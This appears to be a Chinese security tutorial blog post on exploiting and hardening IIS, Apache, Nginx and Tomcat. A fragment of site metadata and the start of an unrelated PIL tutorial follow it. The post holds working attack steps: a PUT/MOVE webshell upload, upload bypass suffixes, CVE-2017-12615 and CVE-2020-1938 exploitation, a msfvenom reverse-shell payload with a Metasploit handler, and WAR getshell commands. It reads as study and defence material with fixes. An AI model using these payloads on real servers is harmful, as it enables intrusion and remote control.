抓包，将GET请求改为OPTIONS。 1options 请求属于浏览器的预检请求，查看服务器是否接受请求，预检通过后，浏览器才会去发 get， post， put， delete 等请求。 用PUT上传一个txt文件 12345PUT /test.txt HTTP/1.1Host: 127.0.0.1Content-Length:27steady is very cool 成功上传。 用PUT上传一个ASP文件，这时候是禁止上传ASP文件 使用MOVE请求方法，并利用刚刚上传的上去的test.txt，修改文件后缀。 123MOVE &#x2F;test.txt HTTP&#x2F;1.1Host: 127.0.0.1Destination: http:&#x2F;&#x2F;127.0.0.1&#x2F;aaa.asp 1MOVE方式 将指定的资源移动到Destination消息头指定的位置 短文件名猜解远程代码执行漏洞介绍及成因在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 漏洞复现利用poc 解析漏洞漏洞介绍及成因IIS6.0 在处理含有特殊符号的文件路径时会出现逻辑错误。 漏洞前提1IIS6.0 漏洞复现1利用方式1 新建一个名字为test.asp的目录，然后访问该目录下的所有文件，都会被当作asp执行。 访问路径 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp&#x2F;1.jpg 利用方式2 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 访问路径 1http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp;.jpg 漏洞前提2IIS7.5 漏洞复现2URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，php默认开启 “cgi.fix_pathinfo”, 会对文件进行 “修理” 。若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 漏洞修复1、过滤.asp/xm.jpg，通过ISApi组件过滤。 2、对新建目录文件名进行过滤，不允许新建包含‘.‘的文件。 3、限制上传的脚本执行权限，不允许执行脚本 Apacheapache学习apache配置文件主要的配置文件在conf文件夹中,额外的存在于conf.d文件夹中,我们如果不想单独的去修改主要的配置文件http.d,我们可以临时的在conf.d中新建立一个conf文件,来修改和添加我们的配置,最终我们可以在主配置文件中使用命令Include去包涵我们的配置文件。 apache与php的结合1、CGI 2、FastCGI 3、Module 在https.conf(主配置文件)或者单独的配置文件中都可以使用&lt;IfModule&gt;指令来加载php_module。 apache的配置指令&lt;Directory&gt;指令&lt;Directory&gt;和&lt;/Directory&gt;用于封装一组指令，使之仅对某个目录及其子目录生效。 语法：&lt;Directory Directory-path&gt; … &lt;/Directory&gt;。 &lt;Files&gt;指令提供基于文件名的访问控制，类似于&lt;Directory&gt;和&lt;Location&gt;指令。 语法：&lt;Files filename&gt; …&lt;/Files&gt; &lt;Files&gt;能嵌入到&lt;Directory&gt;段中以限制它们作用的文件系统范围。 filename参数应当是一个文件名或是一个包含通配符的字符串，其中”?”匹配任何单个字符，”*”匹配任何字符串序列。在”~”字符之后同样可以使用正则表达式。 &lt;FilesMatch&gt;指令包含作用于与正则表达式匹配的文件名的指令 语法&lt;FilesMatch regex&gt; …&lt;/FilesMatch&gt; &lt;FilesMatch&gt;指令就像&lt;Files&gt;指令一样提供了针对文件名的访问控制。然而，它使用的是正则表达式。比如说： 1&lt;FilesMatch &quot;\\.(gif|jpe?g|png)$&quot;&gt; 将匹配最常见的internet图形文件格式。 &lt;Location&gt;指令将封装的指令作用于匹配的URL。 例如，拒绝访问任何以”/private”开头的URL路径。 123&lt;LocationMatch &quot;^/private&quot;&gt; Require all denied&lt;/LocationMatch&gt; &lt;LocationMatch&gt;指令将封装的指令作用于正则表达式匹配的URL。 &lt;LocationMatch&gt;和&lt;Location&gt;指令相同，提供了基于URL的访问控制。但它使用正则表达式作为参数，而不是简单字符串。比如： 1&lt;LocationMatch &quot;&#x2F;(extra|special)&#x2F;data&quot;&gt; 将匹配包含子串”/extra/data”或”/special/data”的URL。 更多介绍 1https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jishume&#x2F;articles&#x2F;2079697.html SetHandler指令为具有特定文件 extensions 的文件配置特定处理程序。 123&lt;FilesMatch &quot;\\.php$&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; AddTypeAddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。本指令可用来增加没有在媒体类型文件(参阅TypesConfig指令)中定义的映射关系。 AddHandle指定带extension扩展名的文件应被handler-name处理器来处理。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。例如，为了把扩展名为.cgi的文件作为CGI脚本来处理，你应该定义： 1AddHandler cgi-script .cgi 一旦将上述定义放在你的http.conf文件中，所有包含.cgi扩展名的文件，都会被当成是CGI程序。 AddHandler application/x-httpd-php .jpg。 .jpg后缀的文件会交给php去处理,进而执行文件中的php代码。 解析漏洞漏洞介绍及成因Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。 Apache文件解析漏洞涉及到一个解析文件的特性： Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.types内），则继续向左识别，当我们请求这样一个文件：steady.xxx.yyy 1steady-&gt;无法识别，向左xxx-&gt;无法识别，向左-&gt;php-&gt;发现后缀是php，交给php处理这个文件。 1.php.jpg成功的前提是: mime文件或者AddType没有设置jpg的对应的类型,apache识别不了jpg,进而识别PHP(大多数都能识别jpg) 配置文件使用AddHandler,以至于无论后缀文件是什么,有几个,只要看见该指令指定的文件类型,就交给php解析 AddHandler application/x-httpd-php 文件类型 以上条件满足之一就可(1.php.xxx同理) 无论后缀有几个,有多少只要看见php就会被解析,前提: 使用了AddHandle、&lt;FilesMatch&gt; Apache的.htaccess利用技巧.htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。 作用范围.htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，子目录中的指令会覆盖父目录或者主配置文件中的指令。 配置方式1在服务器的主配置文件将 AllowOverride 设置为 All 注意该文件的名字可以随意更改。 漏洞修复1、htaccess文件 &lt;Directory&gt;中配置AllowOverride None 也就是在当前目录下htaccess文件不起作用 http.conf主配置文件中禁止该类文件运行 123&lt;Files &quot;.ht*&quot;&gt; Require all denied&lt;&#x2F;Files&gt; 2、php文件 限制php的运行,直接使用&lt;Files&gt;禁止任何php的运行以及访问 如果想允许php文件的运行,使用&lt;FilesMatch&gt;中的正则表达式严格限制后缀,不建议使用AddHandle 3、隐藏banner信息 ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称） ServerSignature On 修改为：ServerSignature Off（不回显apache版本信息） 4、删除默认网站及页面 删除默认的页面，防止泄露服务器信息 5、合理配置apache的运行账户 为apache单独建立一个运行账户及账户组，并在httpd.conf配置 12User apacheGroup apache 6、合理控制apache运行账户对磁盘的写入，执行权限 取消apache运行账户对网站目录的写入权限，上传目录除外，其他非网站目录尽量不给权限 7、配置httpd.conf取消对上传目录的php执行权限 12345&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt; &lt;FilesMatch &quot;.(php|php5)$&quot;&gt; Deny from all &lt;&#x2F;FilesMatch&gt; &lt;&#x2F;Directory&gt; 8、配置httpd.conf限制禁止访问的文件夹，例如后台目录 123&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt; Deny from all &lt;&#x2F;Directory&gt; 9、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 12345&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;&#x2F;Directory&gt; 10、配置httpd.conf修改修改监听端口来防止一些内部系统被扫描 1Listen 12345 11、关闭对.htaccess的支持 1AllowOverride None 目录遍历漏洞漏洞介绍及成因由于配置错误导致的目录遍历。 漏洞复现直接访问ip，比如127.0.0.1，可遍历路径。 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； NginxNginx学习nginx是如何解析php的?CGI、fast-cgi早期服务器只能解析html、js这样的静态资源,但是我们如果要想解析php这样的动态语言怎么办？服务器解析不了我们可以使用php解析器,然后解析器与服务器之间进行交流,不同的解析器与服务器进行交流要靠CGI协议,只要你按照CGI协议去编写程序,就能实现他们之间的交流.常见的php解析器(遵循CGI协议)有php-cgi、php-fpm. 对于cgi协议,服务器在每次接受到请求的时候都会fork一个进程,请求结束就要kill这个进程,有1000个请求,就要kill、fork1000次,很显然有点浪费. Fast-cgi每次fork一个进程的时候,并不会去立即kill,而是一个fork可以处理多个请求。 fast-cgi一个进程会处理多个请求,大大提高了效率 php-fpm是一种利用fast-cgi的php解析器,提供进程管理的功能. 进程包含master和worker进程,master进程之后一个负责监听端口,接受服务器的请求,worker进程可以有多个,每一个进程内部都有php解析器,是php代码执行的地方. nginx与php-fpm我们知道nginx有反向代理的功能,可以来处理客户端、服务端之间的请求和相应,而php-fpm在这里可以说是一个代理服务器的作用,nginx服务器接受到文件不会去处理,会交给php解析器php-fpm。 nginx.php 12345678910location ~ \\.php$ &#123; root /Applications/MxSrvs/www; //后面的地址就是php解析器,php-fpm的的地址 fastcgi_pass 127.0.0.1:10080; fastcgi_index index.php; //设置传递给php解析器的参数值,以下的路径是指在安装php-fpm主机上存放php文件的路径 fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; //SCRIPT_FILENAME是什么呢？他是一个参数,我们nginx需要把参数传递给&quot;代理服务器&quot;php-fpm,后面的就是参数的值,只不过他们是由固定变量组成的&#125; 常见的参数 12345678910fastcgi_param SCRIPT_FILENAME $documentroot$fastcgi_script_name;#脚本文件请求的路径fastcgi_param QUERY_STRING $query_string; #请求的参数;如?app&#x3D;123fastcgi_param REQUEST_METHOD $request_method; #请求的动作(GET,POST)fastcgi_param CONTENT_TYPE $content_type; #请求头中的Content-Type字段fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。fastcgi_param SCRIPT_NAME $fastcgi_script_name; #脚本名称fastcgi_param REQUEST_URI $request_uri; #请求的地址不带参数fastcgi_param DOCUMENT_URI document_uri; #与document_uri; #与uri相同。fastcgi_param DOCUMENT_ROOT $document_root; #网站的根目录。在server配置中root指令中指定的值fastcgi_param PATH_INFO $path_info;#可自定义变量 常规流程12345678910111213141516171819202122232425262728www.example.com | | Nginx | |路由到www.example.com&#x2F;index.php | |加载nginx的fast-cgi模块 | |fast-cgi监听127.0.0.1:9000地址 | |www.example.com&#x2F;index.php请求到达127.0.0.1:9000 | |php-fpm 监听127.0.0.1:9000 | |php-fpm 接收到请求，启用worker进程处理请求 | |php-fpm 处理完请求，返回给nginx | |nginx将结果通过http返回给浏览器 nginx的pathinfo配置讲之前我们需要理解一下伪静态,静态是指静态页面比如html、css等,没有页面交互,动态自然指的是动态页面,有页面交互,伪静态就是动态页面的静态表现. 我们在开发的时候经常使用MVC模式,由此我们在URL中访问网站也需要指定M、V、C参数,比如http://www.cxzaixian.com/index.php?m=topic&amp;a=detail&amp;tid=82,转化为伪静态之后是http://www.cxzaixian.com/index.php/topic/detail/tid/82.html. 后台代码拿到为静态URL之后,由相应的解析逻辑代码进行转化 12apache服务器本身是支持pathinfo的，通过简单修改几项配置即可。当配置支持pathinfo后，在php应用程序中，通过_SERVER[&#39;PATH_INFO&#39;]变量获取pathinfo值为&#x2F;topic&#x2F;detail&#x2F;tid&#x2F;82.html。 我们就可以很容易通过php逻辑代码来解析出controller文件、action方法、以及剩余的动态参数，进而就可以返回正确的网页响应。但是我们要说的nginx服务器默认是不支持pathinfo模式访问。实质上就是nginx不会去设置环境变量PATH_INFO 的值，导致php应用程序不能通过_SERVER[&#39;PAHT_INFO&#39;]来获取path_info, 也就不能解析出对应的动态参数。 123456789101112131415161718192021location ~ \\.php &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; #定义变量 $path_info ，用于存放pathinfo信息 set $path_info &quot;&quot;; #定义变量 $real_script_name，用于存放真实地址 set $real_script_name $fastcgi_script_name; #如果地址与引号内的正则表达式匹配 if ($fastcgi_script_name ~ &quot;^(.+?\\.php)(/.+)$&quot;) &#123; #将文件地址赋值给变量 $real_script_name set $real_script_name $1; #将文件地址后的参数赋值给变量 $path_info set $path_info $2; &#125; #配置fastcgi的一些参数 fastcgi_param SCRIPT_NAME $real_script_name; fastcgi_param PATH_INFO $path_info;&#125; 使用 php 的 cgi.fix_pathinfo 功能此方式通过将 php.ini 当中的 cgi.fix_pathinfo 设置为1, 并且在 nginx 中加入一条 fastcgi_param PATH_INFO $fastcgi_script_name; 当开启 fix_pathinfo 之后, php 会根据 CGI 1.1 的规范来分析 SCRIPT_FILENAME, 从中截取什么是真正的执行脚本, 什么是 PATH_INFO, 并且修正对应的变量 FAST-CGI解析漏洞漏洞介绍及成因nginx.conf 1234567891011121314location ~ \\.php($|&#x2F;) &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; set $script $uri; set $path_info &quot;&quot;; if ($uri ~ &quot;^(.+\\.php)(&#x2F;.*)&quot;) &#123; set $script $1; set $path_info $2; &#125; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$script; fastcgi_param SCRIPT_NAME $script; fastcgi_param PATH_INFO $path_info;&#125; 通过正则匹配以后, SCRIPT_NAME会被设置为”fake.jpg/foo.php”, 继而构造成SCRIPT_FILENAME传递个PHP CGI，fix_pathinfo开启之后PHP会认为SCRIPT_FILENAME是fake.jpg, 而foo.php是PATH_INFO, 然后PHP就把fake.jpg当作一个PHP文件来解释执行。 最重要的一点是 php-fpm.conf 中的 security.limit_extensions 配置项限制了 fastcgi 解析文件的类型(即指定什么类型的文件当做代码解析),此项设置为空的时候才允许 fastcgi 将 .png 等文件当做代码解析。 尝试浏览器访问一下,具体的文件路径,可以看到脚本名字、脚本路径 &lt;?php var_dump($_SERVER)?&gt; 漏洞复现1ip&#x2F;1.jpg&#x2F;1.php 漏洞修复http://xiumu.blog.51cto.com/hacker.jpg/abc.php成功利用的前提 1、php.ini中的配置选项cgi.fix_pathinfo=1并且php-fpm中的security.limit_extensions没有开启 从5.3.9开始,php官方加入了一个配置”security.limit_extensions”,默认只允许执行扩展名为”.php”的文件,造成了其他类型的文件不支持的问题. 将 cgi.fix_pathinfo = 0 ,可能会导致很多MVC框架(如ThinkPHP)对url美化无法正常运行。 防御思路 1、开启 security.limit_extensions=.php 只允许后缀为php的文件解析 2、 使用 nginx 的 fastcgi_split_path_info 功能 此种方式依赖 nginx 的 fastcgi_split_path_info 指令, 该指令通过正则表达式来对 uri 进行处理, 从中分理出真实脚本文件和 PATH_INFO, 并根据正则捕获组来设置两个重要变量 $fastcgi_script_name $fastcgi_path_info TomcatTomcat学习Tomcat与ServletTomcat目录结构 1234567* bin :tomcat的执行的文件.* conf :tomcat的配置文件.* lib :tomcat运行的需要的jar包.* logs :tomcat的运行的日志文件.* temp :tomcat产生临时文件存放的路径.* webapps :tomcat发布的web项目的路径.* work :tomcat运行JSP的时候,JSP翻译成Servlet的代码存放的路径. Tomcat发布项目 将编写并编译好的web项目(注意要是编译好的，如果是 eclipse，可以将项目打成 war 包放入)，放入到 webapps 中。 在浏览器输入：http://localhost:8080/项目名/访问的文件名。 打开tomcat下conf/server.xml，在&lt;Host&gt; &lt;/Host&gt;标签之间输入项目配置信息 1&lt;Context path&#x3D;&quot;&#x2F;WebProject&quot; docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt; path:浏览器访问时的路径名 docBase:web项目的WebRoot所在的路径，注意是WebRoot的路径，不是项目的路径。其实也就是编译后的项目 reloadble:设定项目有改动时，tomcat是否重新加载该项目 浏览器访问 1127.0.0.1:8080&#x2F;WebProject&#x2F;HelloTomcat.jsp 进入到 apache-tomcat-7.0.52\\conf\\Catalina\\localhost 目录，新建一个 项目名.xml 文件。 在 那个新建的 xml 文件中，增加下面配置语句 1&lt;Context docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt; localhost:8080/xml文件名/访问的文件名。 ①、第一种方法比较普通，但是我们需要将编译好的项目重新 copy 到 webapps 目录下，多出了两步操作。 ②、第二种方法直接在 server.xml 文件中配置，但是从 tomcat5.0版本开始后，server.xml 文件作为 tomcat 启动的主要配置文件，一旦 tomcat 启动后，便不会再读取这个文件，因此无法再 tomcat 服务启动后发布 web 项目。 ③、第三种方法是最好的，每个项目分开配置，tomcat 将以\\conf\\Catalina\\localhost 目录下的 xml 文件的文件名作为 web 应用的上下文路径，而不再理会 &lt;Context&gt;中配置的 path 路径，因此在配置的时候，可以不写path。 Tomcat敏感目录tomcat-users.xml 用户配置文件获取用户账户、密码 1234567&lt;!-- &lt;role rolename&#x3D;&quot;tomcat&quot;&#x2F;&gt; &lt;role rolename&#x3D;&quot;role1&quot;&#x2F;&gt; &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat&quot;&#x2F;&gt; &lt;user username&#x3D;&quot;both&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat,role1&quot;&#x2F;&gt; &lt;user username&#x3D;&quot;role1&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;role1&quot;&#x2F;&gt;--&gt; servlettomcat和servlet的关系Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户.而Servlet是一种运行在支持Java语言的服务器上的组件. Servlet最常见的用途是扩展Java Web服务器功能,提供非常安全的,可移植的,易于使用的CGI替代品. 从http协议中的请求和响应可以得知，浏览器发出的请求是一个请求文本，而浏览器接收到的也应该是一个响应文本。但是在上面这个图中，并不知道是如何转变的，只知道浏览器发送过来的请求也就是request，我们响应回去的就用response。 ①：Tomcat将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，所有的HTTP头数据读可以通过request对象调用对应的方法查询到。 ②：Tomcat同时会要响应的信息封装为HttpServletResponse类型的response对象，通过设置response属性就可以控制要输出到浏览器的内容，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器 Java Servlet API 是Servlet容器(tomcat)和servlet之间的接口，它定义了serlvet的各种方法，还定义了Servlet容器传送给Servlet的对象类，其中最重要的就是ServletRequest和ServletResponse。所以说我们在编写servlet时，需要实现Servlet接口，按照其规范进行操作。 web.xml中servlet配置及其含义要从浏览器访问Java servlet，必须告诉servlet容器要部署哪些servlet以及要将servlet映射到哪个URL。 这是在Java Web应用程序的web.xml文件中完成的。 首先浏览器通过http://localhost:8080/test01/MyServlet来找到web.xml中的url-pattern，这就是第一步，匹配到了url-pattern后，就会找到第二步servlet的名字MyServlet，知道了名字，就可以通过servlet-name找到第三步，到了第三步，也就能够知道servlet的位置了。然后到其中找到对应的处理方式进行处理。 漏洞利用CVE-2017-12615影响版本：Apache Tomcat 7.0.0-Apache Tomcat 7.0.81 漏洞原理Tomcat PUT方法任意写文件漏洞 该漏洞可以利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限。 在Tomcat的web.xml默认情况下不存在该漏洞，但是一单开发者或者运维人员手动讲web.xml中的readonly设置为false，可以通过 PUT / DELETE 进行文件操控。 漏洞的核心错误配置是web.xml中的readonly 1234&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; 漏洞利用 访问shell 1192.168.1.102:8080&#x2F;Shell.jsp?cmd&#x3D;id 绕过方式win： 1、利用/shell.jsp::$DATA的方式绕过2、/shell.jsp%20，空格绕过3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/Linux：1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/ 漏洞分析 web.xml配置 12345678910111213&lt;servlet&gt; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;fork&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;&lt;/servlet&gt; 12345678910111213&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 1234567891011&lt;servlet-mapping&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;!-- The mappings for the JSP servlet --&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt; &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt; &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 我们可以看到如果url中有jsp、jspx会使用名字为jsp的servlet，进而调用org.apache.jasper.servlet.JspServlet类 反之调用默认servlet，进而调用org.apache.catalina.servlets.DefaultServlet。 readonly 作用 123&lt;!-- readonly Is this context &quot;read only&quot;, so HTTP --&gt;&lt;!-- commands like PUT and DELETE are --&gt;&lt;!-- rejected? [true] --&gt; 关键 配置文件中主要定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。 可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。 漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。上传jsp文件但是让他DefaultServlet来处理他。、 防御方式 使用tomcat8及以上版本 在web.xml文件中将readonly参数删掉，或者将readonly参数设置为true CVE-2020-1938影响版本 Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x &lt; 8.5.51Apache Tomcat 7.x &lt; 7.0.100Apache Tomcat 6.x Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。 当ajp URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。当ajp URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞。 Web目录任意文件读取漏洞长亭扫描器 1➜ xray .&#x2F;xray webscan --url http:&#x2F;&#x2F;127.0.0.1:8080&#x2F; --html-output single-url.html 任意命令执行该漏洞可以任意文件类型解析为jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞才可利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果： 1234margine:CVE-2020-1938 margin$ python 2020-10487.py -f &#x2F;shell.png 127.0.0.1 --rce 1Getting resource at ajp13:&#x2F;&#x2F;127.0.0.1:8009&#x2F;hissec.jsp----------------------------root 反弹shell 1msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;4444 &gt; shell.txt 123456789101112msf5 &gt; use exploit&#x2F;multi&#x2F;handler msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_set payload java&#x2F;jsp_shell_bind_tcp set payload java&#x2F;jsp_shell_reverse_tcp msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_reverse_tcp payload &#x3D;&gt; java&#x2F;jsp_shell_reverse_tcpmsf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.67lhost &#x3D;&gt; 192.168.0.67msf5 exploit(multi&#x2F;handler) &gt; set lport 4444lport &#x3D;&gt; 4444msf5 exploit(multi&#x2F;handler) &gt; run[*] Started reverse TCP handler on 192.168.0.67:4444 12python 2020-10487.py -f &#x2F;shell.txt 127.0.0.1 --rce 1弱口令 修复方法 禁用AJP协议 &lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443” /&gt; 将此行注释掉（也可删掉该行）： 配置secret来设置AJP协议的认证凭证。 例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）： &lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443”address=”YOUR_TOMCAT_IP_ADDRESS” secret=”YOUR_TOMCAT_AJP_SECRET”/&gt; 弱口令版本范围：Tomcat版本：8.0 漏洞原理：Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。 在conf/tomcat-users.xml文件中配置用户的权限： 1&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt; manager-gui 拥有html页面权限 manager-status 拥有查看status的权限 manager-script 拥有text接口的权限，和status权限 manager-jmx 拥有jmx权限，和status权限 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot; version=&quot;1.0&quot;&gt; &lt;role rolename=&quot;manager-gui&quot;/&gt; &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;role rolename=&quot;manager-jmx&quot;/&gt; &lt;role rolename=&quot;manager-status&quot;/&gt; &lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;role rolename=&quot;admin-script&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt; &lt;/tomcat-users&gt; 可见，用户tomcat拥有上述所有权限，密码是tomcat。 正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。 打开tomcat管理页面http://your-ip:8080/manager/html，输入弱密码tomcat:tomcat，即可访问后台： 上传war包即可直接getshell。 war制作 压缩jsp马然后改为war后缀 war包名字和shell名字一样 1jar cvf shell.war shell.jsp","categories":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"CTF-python库PIL的使用","slug":"CTF-python库PIL的使用","date":"2019-04-17T14:14:20.000Z","updated":"2020-11-15T10:01:15.339Z","comments":true,"path":"2019/04/17/CTF-python库PIL的使用/","link":"","permalink":"http://s1eady.top/2019/04/17/CTF-python%E5%BA%93PIL%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"CTF-python库的使用-PIL库PIL库生成Image对象im是一个Image对象，属性有format，size，mode。format是格式，size 是一个元组，表示(宽，高)，mode则指的图片的模式。 12345from PIL import Image#生成一个image对象。img = Image.open(&#x27;sunset.jpg&#x27;)#显示图片img.show() Image对象常用方法12345678im.save(&#39;test.jpg&#39;, &#39;jpeg&#39;) 保存到文件，第二个参数为格式im.show() 显示图像，会启动一个新窗口im.size (这是属性不是方法)得到图像的大小，返回值为tuple，可以通过元组来读取。im &#x3D; im.convert(&#39;L&#39;) 色彩空间的转换，支持RGB、CMYK等常见空间，注意这个函数不是就地的结果保存在返回值里im.colors() 很有用的方法，返回颜色统计列表(count, color)，可以判断图像中的色彩分布im.hist() 直方图，与colors方法类似，但直接返回的是每个像素的直方高度im.getpixel((x, y)) 得到某个像素点的颜色，一般返回(r, g, b)im.putpixel((x, y), color) 设置某个像素点的颜色，这个操作是就地的 im.size打印出像素值。也就是图片的高度宽度。 1234from PIL import Imageimg = Image.open(&#x27;sunset.jpg&#x27;)print(img.size)(2000, 1328) 遍历图片的每一个坐标或像素。 1234567from PIL import Imageimg = Image.open(&#x27;sunset.jpg&#x27;)print(img.size)for i in range(img.size[0]): for j in range(img.size[1]): print(i,j) im.getpixel((x, y))得到某个像素点的颜色，一般返回(r, g, b) 遍历每个像素点的颜色。 12345678from PIL import Imageimg = Image.open(&#x27;sunset.jpg&#x27;)print(img.size)print(img.size)for i in range(img.size[0]): for j in range(img.size[1]): print(img.getpixel((i, j))) 图片剪贴crop()方法 1234im = 